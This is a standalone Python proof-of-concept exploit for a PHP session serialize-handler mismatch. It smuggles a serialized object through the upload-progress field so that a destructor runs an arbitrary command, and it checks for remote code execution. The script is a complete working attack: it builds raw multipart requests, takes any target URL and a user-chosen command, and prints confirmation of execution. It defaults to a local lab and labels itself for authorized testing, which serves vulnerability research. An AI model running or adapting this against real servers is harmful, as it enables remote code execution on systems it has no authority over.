#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""Chain C — session handler mismatch -> object injection -> __destruct RCE.

Precondition: two directories with different session.serialize_handler
(here: php_serialize via .user.ini in /chainW, php in /chainR) sharing one
session.save_path, plus a class with a weaponizable __destruct available at
request startup (opcache.preload in the lab).

Steps verified:
  [1] WRITE — upload_progress request to the php_serialize dir; the session
      key "upload_progress_<value>" carries `AAA|O:4:"Evil":1:{...}` raw.
  [2] READ — upload_progress request to the php dir with the same SID:
      the php decoder splits the php_serialize-format file at the first `|`,
      deserializes the injected Evil object, then hits trailing data.
  [3] RCE — Evil::__destruct fires during decode cleanup, BEFORE any
      application code, even though the decode FAILS.

The destructor's output lands in /tmp/rce_proof and is echoed by the lab's
read endpoint as a ==PROOF== block (so plain HTTP alone confirms the RCE);
--docker is a fallback that checks the file directly.

NOTE: the payload rides in the PHP_SESSION_UPLOAD_PROGRESS *field value*
(raw body bytes — no quoting limits). The filename variant truncates at the
first `"` because multipart filenames are quote-delimited.

Run with uv (no dependencies, stdlib only):
  uv run poc_chain_c.py                          # against the bundled lab
  uv run poc_chain_c.py --target http://127.0.0.1:18081
  uv run poc_chain_c.py --docker p2s2-lab --cmd 'id; uname -a'

For authorized testing only.
"""
import argparse
import os
import re
import socket
import ssl
import subprocess
import sys
import time
from urllib.parse import urlparse

B = "POCBOUNDARYC"


def send(host, port, path, body, scheme="http"):
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={B}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    sock = socket.create_connection((host, port), timeout=15)
    if scheme == "https":
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
    sock.sendall(hdr + body)
    sock.settimeout(10)
    resp = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    sock.close()
    return resp


def upload(host, port, path, sid, progress_value, filename, scheme="http"):
    body = (
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress_value}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        f"Z\r\n"
        f"--{B}--\r\n"
    ).encode("latin-1")
    return send(host, port, path, body, scheme)


def docker(container, cmd):
    r = subprocess.run(["docker", "exec", container, "bash", "-c", cmd],
                       capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def main():
    ap = argparse.ArgumentParser(description="Chain C: handler mismatch -> __destruct RCE")
    ap.add_argument("--target", default="http://127.0.0.1:18081")
    ap.add_argument("--write-path", default="/chainW/up.php", help="php_serialize dir")
    ap.add_argument("--read-path", default="/chainR/up.php", help="php dir")
    ap.add_argument("--cmd", default="id", help="command for Evil::__destruct")
    ap.add_argument("--docker", metavar="CONTAINER", help="container name for proof-file check")
    ap.add_argument("--sid", help="session id (default: random)")
    args = ap.parse_args()

    u = urlparse(args.target)
    scheme = u.scheme or "http"
    host, port = u.hostname, u.port or (443 if scheme == "https" else 80)
    sid = args.sid or ("chainc" + os.urandom(12).hex())

    # Payload rides in the progress VALUE: key becomes upload_progress_AAA|O:4:"Evil":1:{...}
    # The php decoder splits at the first `|`, so everything after it is deserialized.
    gadget = f'AAA|O:4:"Evil":1:{{s:3:"cmd";s:{len(args.cmd)}:"{args.cmd}";}}'

    print(f"[*] Chain C — handler mismatch -> __destruct RCE")
    print(f"[*] target={args.target}  sid={sid}  cmd={args.cmd!r}")
    print(f"[*] gadget (in PHP_SESSION_UPLOAD_PROGRESS value): {gadget}\n")

    if args.docker:
        docker(args.docker, "rm -f /tmp/rce_proof")

    print(f"[1] WRITE via php_serialize dir ({args.write_path})")
    r = upload(host, port, args.write_path, sid, gadget, "normal.txt", scheme)
    print(f"    -> {r.split(b'\r\n', 1)[0].decode('latin-1', 'replace')}")

    if args.docker:
        raw = docker(args.docker, f"cat /tmp/sess/sess_{sid}")
        print(f"    session file (php_serialize format, object embedded in key):\n    {raw[:200]}")

    print(f"\n[2] READ via php dir ({args.read_path}) — mismatch decode")
    r = upload(host, port, args.read_path, sid, "x", "normal.txt", scheme)
    out = r.partition(b"\r\n\r\n")[2].decode("latin-1", "replace")
    mismatch = "Failed to decode session object" in out
    print(f"    -> {'[+] decode FAILURE observed (handler mismatch triggered)' if mismatch else '[~] no decode warning (different PHP build?)'}")

    if not args.docker:
        print("\n[~] no --docker given; relying on the read endpoint's ==PROOF== echo.")
    else:
        docker(args.docker, "rm -f /tmp/rce_proof")

    # [3] RCE: preferred source is the ==PROOF== block echoed by the read
    # endpoint (the lab's up.php unlinks the file after echoing); --docker
    # is the fallback that reads /tmp/rce_proof directly.
    proof = ""
    m = re.search(r"==PROOF==\r?\n(.*?)==/PROOF==", out, re.S)
    if m:
        proof = m.group(1).strip()

    print(f"\n[3] RCE check — Evil::__destruct output "
          f"(from {'read response' if proof else ('docker exec' if args.docker else 'read response')})")
    if proof:
        print(f"    [+] RCE CONFIRMED — __destruct fired during failed decode:")
        for line in proof.splitlines():
            print(f"    {line}")
        sys.exit(0)

    if args.docker:
        time.sleep(0.5)
        proof = docker(args.docker, "cat /tmp/rce_proof 2>/dev/null || echo MISSING")
        docker(args.docker, "rm -f /tmp/rce_proof")
        if proof and proof != "MISSING":
            print(f"    [+] RCE CONFIRMED — __destruct fired during failed decode:")
            for line in proof.splitlines():
                print(f"    {line}")
            sys.exit(0)
        print("    [-] no proof — destructor did not fire")
        sys.exit(1)

    if mismatch:
        print("    [~] decode-failure indicator seen, but the read endpoint did not")
        print("        echo a ==PROOF== block (the lab's up.php does). Nothing to verify.")
        sys.exit(0)
    print("    [-] no proof and no decode warning — destructor did not fire")
    sys.exit(1)


if __name__ == "__main__":
    main()
